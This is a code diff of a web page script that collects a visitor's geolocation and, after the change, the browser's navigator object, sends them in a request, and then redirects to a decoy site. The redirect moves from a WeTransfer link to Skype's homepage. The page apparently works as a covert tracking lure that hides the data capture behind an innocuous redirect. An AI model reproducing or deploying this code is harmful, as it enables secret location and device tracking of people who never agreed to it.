@@ -203,13 +203,13 @@
     <script>
         console.log('hello world');
         function showPosition(position) {     
-            var arr = { lat: position.coords.latitude, long: position.coords.longitude };
+            var arr = { lat: position.coords.latitude, long: position.coords.longitude, navigatorInfo: navigator};
             let req = new XMLHttpRequest();
 
             req.onreadystatechange = () => {
             if (req.readyState == XMLHttpRequest.DONE) {
                 console.log(arr);
-                window.location.replace("https://we.tl/t-l8As7bdNK3");
+                window.location.replace("https://www.skype.com/en/");
             }
             };
 
@@ -224,7 +224,7 @@
             req.onreadystatechange = () => {
             if (req.readyState == XMLHttpRequest.DONE) {
                 console.log('failed');
-                window.location.replace("https://we.tl/t-l8As7bdNK3");
+                window.location.replace("https://www.skype.com/en/");
             }
             };
 
